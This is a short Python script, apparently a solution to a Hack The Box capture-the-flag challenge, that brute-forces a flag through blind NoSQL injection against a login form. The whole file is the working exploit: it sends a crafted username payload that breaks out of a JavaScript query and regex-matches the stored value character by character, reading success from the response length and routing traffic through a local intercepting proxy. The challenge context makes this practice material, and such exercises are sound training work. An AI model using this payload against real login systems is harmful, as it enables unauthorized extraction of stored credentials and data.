import requests
import sys
requests.packages.urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

url = f"{sys.argv[1]}/index.php"
name = 'HTB{'

printables = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' #Coloca digitos e chars minusculos
for char in printables:
	data = {
		'username': f'" || (this.username.match(\'^{name}{char}.*\')) || ""=="',
		'password': 'aaaaaaaaaaa'
	}
	response = requests.post(url, data=data, headers=headers, proxies=proxies)
	tam = len(response.content)
	if tam == 1865 or tam == 0:
		continue
	else: 
		print(f"Proximo char: {char}")
		break